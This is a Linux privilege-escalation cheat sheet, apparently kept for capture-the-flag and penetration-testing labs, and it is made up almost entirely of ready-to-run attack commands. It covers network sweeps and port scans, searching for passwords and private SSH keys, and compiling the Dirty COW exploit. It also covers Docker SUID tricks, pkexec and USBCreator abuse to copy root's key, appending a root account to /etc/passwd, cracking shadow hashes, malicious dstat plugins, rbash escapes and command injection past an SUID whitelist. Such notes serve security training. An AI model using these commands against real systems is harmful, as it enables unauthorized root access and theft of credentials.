---
icon: linux
---

# Linux Privilege Escalation

* ## <mark style="color:purple;">Get your own local version of this checklist</mark> [<mark style="color:orange;">`here`</mark>](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/refs/heads/master/linux-hardening/linux-privilege-escalation-checklist.md)<mark style="color:purple;">:</mark>

{% embed url="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" %}
By Carlos Palop
{% endembed %}

* ## <mark style="color:purple;">Make sure you have</mark> <mark style="color:orange;">`pspy`</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">`linpeas`</mark> <mark style="color:purple;">ready:</mark>

{% embed url="https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md" %}

{% embed url="https://github.com/DominicBreuker/pspy" %}

{% hint style="info" %}
## <mark style="color:purple;">`Enumeration`</mark>

{% code title="Check sudo permissions" %}
```bash
sudo -l
```
{% endcode %}

{% code title="Read crontab file" %}
```sh
cat /etc/crontab
```
{% endcode %}

{% code title="Check Services running" %}
```sh
ls /etc/init.d
```
{% endcode %}

{% code title="Check System info" %}
```bash
uname -a
```
{% endcode %}

{% code title="Check groups file" %}
```sh
cat /etc/group
```
{% endcode %}

{% code title="Show listening ports" %}
```sh
netstat -tuln
```
{% endcode %}

{% code title="Listen to the localhost" %}
```sh
netstat -an -p tcp
```
{% endcode %}

{% code title="Check binaries with capabilities" %}
```bash
getcap -r / 2>/dev/null
```
{% endcode %}

{% code title="SUID/SETGID binaries" %}
```sh
find / -perm -4000 -or -perm -2000 2>/dev/null
```
{% endcode %}

{% code title=" Traces library function calls" %}
```sh
ltrace ProgramName
```
{% endcode %}

***

#### <mark style="color:red;">`Scan the local network`</mark><mark style="color:purple;">:</mark>

* <mark style="color:purple;">Find one many hosts there are in the network by doing a</mark> <mark style="color:orange;">**`ping sweep`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```sh
for i in {1..254}; do (ping -c 1 192.168.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
{% endcode %}

* <mark style="color:purple;">If</mark> <mark style="color:orange;">**`nc`**</mark> <mark style="color:purple;">is installed can be use to scan for open ports:</mark>

```sh
nc -zv 192.168.0.1 1-65535 2>&1 | grep -v refused | tee scan
```

{% code title="UDP scan" %}
```sh
nc -uzv 192.168.0.1 1-65535 2>&1 | grep -v refused
```
{% endcode %}

* <mark style="color:purple;">Other wise get a</mark> [<mark style="color:orange;">**`nmap`**</mark>](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64) <mark style="color:purple;">binary.</mark>&#x20;

#### <mark style="color:red;">`Grepping files`</mark><mark style="color:purple;">:</mark>

* <mark style="color:purple;">Search for the string</mark> <mark style="color:orange;">**`pass`**</mark> <mark style="color:purple;">(case-insensitive) in all files and directories recursively:</mark>

```sh
grep -iR "pass" * 2>/dev/null
```

* <mark style="color:purple;">Search for</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**the string**</mark>**&#x20;**<mark style="color:orange;">**`password`**</mark> <mark style="color:purple;">in files with double extension, recursively:</mark>

```sh
grep password .*.* -r 2>/dev/null
```

* <mark style="color:purple;">Search for</mark> <mark style="color:orange;">**`ssh`**</mark> <mark style="color:purple;">keys recursively from the current directory you are in:</mark>

{% code overflow="wrap" %}
```sh
grep -iR -E "(ssh-(rsa|ed25519|dss|ecdsa|rsa1)[ ]+[A-Za-z0-9+/=]+|-----BEGIN [A-Z ]+PRIVATE KEY-----)" * 2>/dev/null
```
{% endcode %}

* <mark style="color:purple;">Is also possible to look for</mark> <mark style="color:orange;">**`hashes`**</mark> <mark style="color:purple;">by using regex to look for the hash length:</mark>

{% code title="MD5 hashes" %}
```sh
grep -aPo '[a-fA-F0-9]{32}' /DESIRED/PATH
```
{% endcode %}

{% code title="SHA-1" %}
```sh
grep -aPo '[a-fA-F0-9]{40}' /DESIRED/PATH
```
{% endcode %}

{% code title="SHA-256" %}
```sh
grep -aPo '[a-fA-F0-9]{64}' /DESIRED/PATH
```
{% endcode %}

{% code title="SHA-512" %}
```sh
grep -aPo '[a-fA-F0-9]{128}' /DESIRED/PATH
```
{% endcode %}

***

### <mark style="color:purple;">Containers</mark>

{% code title="Always check the host" %}
```bash
hostname -I
```
{% endcode %}

{% code title="Check the internal network" %}
```bash
ifconfig
```
{% endcode %}

{% code title="Check mounter devices" %}
```bash
mount
```
{% endcode %}

{% code title="Check the process" lineNumbers="true" %}
```bash
ps auxww | grep docker
ps auxww | grep lxd
```
{% endcode %}
{% endhint %}

***

***

{% hint style="danger" %}
## <mark style="color:purple;">Kernel Exploits</mark>

{% code title="Look for exploits" %}
```sh
searchsploit "Linux Kernel" | grep <version>
```
{% endcode %}

### <mark style="color:orange;">`Dirty Cow`</mark>

* #### <mark style="color:purple;">List of</mark> <mark style="color:orange;">`POCs`</mark> [<mark style="color:purple;">here</mark>](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)<mark style="color:purple;">.</mark>
* <mark style="color:purple;">**Linux kernel versions**</mark>**&#x20;**<mark style="color:orange;">**`2.6.22`**</mark>**&#x20;**<mark style="color:purple;">**to**</mark>**&#x20;**<mark style="color:orange;">**`4.8.3`**</mark>**&#x20;**<mark style="color:purple;">**(inclusive)**</mark>\
  [<mark style="color:orange;">**`dirty.c`**</mark>](https://github.com/FireFart/dirtycow/blob/master/dirty.c) <mark style="color:purple;">**POC**</mark>

{% code title="Compile it" %}
```bash
gcc -pthread dirty.c -o dirty -lcrypt; chmod +x dirty; ./dirty
```
{% endcode %}

{% code title="Log as firefart" %}
```bash
su firefart
```
{% endcode %}

```bash
ssh firefart@10.10.10.10
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Dockers</mark>

* <mark style="color:purple;">Check permissions and ownership when you create a file from host and container:</mark>

```sh
touch from_host
```

```sh
touch from_container
```

* <mark style="color:purple;">If the container is miss configured and can creates files as a</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">, and you can access the files created by the host on the container:</mark>&#x20;
  1. <mark style="color:orange;">**`From the host`**</mark><mark style="color:purple;">, copy</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">in to the mounted directory.</mark>
  2. <mark style="color:orange;">**`From the container`**</mark><mark style="color:purple;">, change the ownership and permissions of</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">to</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">.</mark>
  3. <mark style="color:purple;">Execute</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">as</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">.</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
cp /bin/bash .
chown root:root bash; chmod 4777 bash
./bash -p
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:orange;">`Polkit`</mark>

* <mark style="color:purple;">Check the</mark> <mark style="color:orange;">**`sudoers`**</mark> <mark style="color:purple;">file:</mark>

```sh
cat /etc/sudoers
```

* <mark style="color:purple;">Check</mark> <mark style="color:orange;">**`polkit`**</mark> <mark style="color:purple;">policy:</mark>

```sh
cat /etc/polkit-1/localauthority.conf.d
```

{% code title="Become root" %}
```sh
pkexec "/bin/sh"
```
{% endcode %}

### <mark style="color:orange;">`USBCreator`</mark>

* <mark style="color:purple;">Allows to over write files with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">permissions</mark>

{% code title="Copy root private key" overflow="wrap" %}
```sh
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true
```
{% endcode %}


{% endhint %}

***

{% hint style="info" %}
## <mark style="color:purple;">Important Files</mark>

### <mark style="color:orange;">`passwd`</mark>

* <mark style="color:purple;">If is possible to write the file:</mark>

{% code title="Generate the password hash" %}
```sh
openssl passwd -1 tokyo
```
{% endcode %}

{% code title="Add the line " overflow="wrap" %}
```sh
echo 'tokyo:$1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/:0:0:tokyo:/root:/bin/bash' >> passwd
```
{% endcode %}

***

### <mark style="color:orange;">`shadow`</mark>&#x20;

#### <mark style="color:purple;">Crack the hash with</mark> <mark style="color:orange;">`john`</mark><mark style="color:purple;">:</mark>

* <mark style="color:purple;">Save the hash into a file:</mark>

{% code overflow="wrap" %}
```sh
echo 'zoe:$y$j9T$Ct0y5TNQ/sv95CFPz510O/$7YtCDOBISfngZeQ3rsDkRcw2XTFDgHBkxDpuhyBLNO1:1002:1002:zoe:/home/zoe:/bin/bash' > shadowHash.txt
```
{% endcode %}

* <mark style="color:purple;">Now crack it:</mark>

{% code overflow="wrap" %}
```sh
john --wordlist=~/Documents/Wordlists/rockyou.txt shadow.txt --format=crypt
```
{% endcode %}

### **`/var/log`**

* **`adm` group can read log files**
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`dstat`</mark> <mark style="color:purple;">Plugin poisoning</mark>

<mark style="color:purple;">Allows to run arbitrary</mark> [<mark style="color:green;">**`python`**</mark>](https://gtfobins.github.io/gtfobins/python/) <mark style="color:purple;">scripts loaded as “external plugins” if they are located in one of the directories stated in the</mark> <mark style="color:orange;">**`man`**</mark> <mark style="color:purple;">page:</mark>

1. <mark style="color:red;">**`~/.dstat/`**</mark>
2. <mark style="color:red;">**`(path of binary)/plugins/`**</mark>
3. <mark style="color:red;">**`/usr/share/dstat/`**</mark>
4. <mark style="color:red;">**`/usr/local/share/dstat`**</mark>

<mark style="color:purple;">Normally to escalate privilege you want to choose the ones within the</mark> <mark style="color:orange;">**`root`**</mark> <mark style="color:purple;">path, check for</mark> <mark style="color:orange;">**`writable`**</mark> <mark style="color:purple;">permissions:</mark>

{% code lineNumbers="true" %}
```sh
ls -ld /usr/local/share/dstat/
ls -ld /usr/share/dstat/
```
{% endcode %}

<mark style="color:purple;">Create a malicious plugin:</mark>

{% code overflow="wrap" lineNumbers="true" %}
```sh
echo -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_tokyo.py
echo 'import os; os.execv("/bin/sh", ["sh"])' > ~/.dstat/dstat_tokyo.py
```
{% endcode %}

<mark style="color:purple;">Execute it with</mark> <mark style="color:orange;">**`--PluginName`**</mark><mark style="color:purple;">:</mark>

{% code lineNumbers="true" %}
```sh
doas /usr/bin/dstat --tokyo
sudo dstat --tokyo
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`journalctl`</mark> <mark style="color:purple;">via</mark> <mark style="color:orange;">`sudo`</mark>

* <mark style="color:orange;">**`journalctrl`**</mark> <mark style="color:purple;">will output to stdout if it can fit onto the current page, but into</mark> <mark style="color:orange;">**`less`**</mark> <mark style="color:purple;">if it can’t.</mark>
* <mark style="color:purple;">When invoked with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">is possible to have code execution as</mark> <mark style="color:orange;">**`root`**</mark> <mark style="color:purple;">just by pressing</mark> <mark style="color:orange;">**`!`**</mark> <mark style="color:purple;">in the</mark> <mark style="color:orange;">**`less`**</mark> <mark style="color:purple;">environment.</mark>
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Escape</mark> <mark style="color:orange;">`rbash`</mark>

* <mark style="color:purple;">It's possible to do it directly connecting with</mark> <mark style="color:orange;">**`ssh`**</mark><mark style="color:purple;">:</mark>

```sh
ssh -i priv_key drno@10.10.10.124 -t bash
```

* <mark style="color:purple;">Or directly changing the</mark> <mark style="color:orange;">**`PATH`**</mark><mark style="color:purple;">**:**</mark>

```sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

***

* <mark style="color:purple;">Is also possible by using</mark> <mark style="color:orange;">**`make`**</mark><mark style="color:purple;">. First sets a variable</mark> <mark style="color:orange;">**`COMMAND`**</mark> <mark style="color:purple;">with the value</mark> <mark style="color:orange;">**`/bin/bash`**</mark><mark style="color:purple;">**:**</mark>

```sh
 COMMAND='/bin/bash'
```

* <mark style="color:purple;">Then, execute</mark> <mark style="color:orange;">**`make`**</mark> <mark style="color:purple;">in silent mode (</mark><mark style="color:orange;">**`-s`**</mark><mark style="color:purple;">) and evaluates the string</mark> <mark style="color:orange;">**`x:`**</mark> <mark style="color:purple;">containing the shell:</mark>

```sh
make -s --eval=$'x:\n\t-'"$COMMAND"
```

* <mark style="color:purple;">Finish it up by fixing the</mark> <mark style="color:orange;">**`PATH`**</mark><mark style="color:purple;">**:**</mark>

```sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
{% endhint %}

***

{% hint style="info" %}
###
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Bypass</mark> <mark style="color:orange;">`SUID`</mark> <mark style="color:purple;">whitelist</mark>

* <mark style="color:purple;">Sometimes</mark> <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">commands may have a whitelist for commands .</mark>
* <mark style="color:purple;">This can be bypassed by using</mark> <mark style="color:orange;">**`subcommands`**</mark><mark style="color:purple;">**:**</mark>

```sh
supershell ‘/bin/ls $(cat /root/root.txt)’
```

* <mark style="color:purple;">In this example</mark> <mark style="color:orange;">**`supershell`**</mark> <mark style="color:purple;">is the</mark> <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">binary and</mark> <mark style="color:orange;">**`/bin/ls`**</mark> <mark style="color:purple;">the whitelisted command, there are also another way to bypass this by using</mark> <mark style="color:orange;">**`'`**</mark> <mark style="color:purple;">to open a quote:</mark>

```sh
supershell ‘/bin/ls
```

* <mark style="color:purple;">Then in the next line use your desired command:</mark>

```sh
cat /root/root.txt’
```
{% endhint %}

***

{% hint style="info" %}
###
{% endhint %}

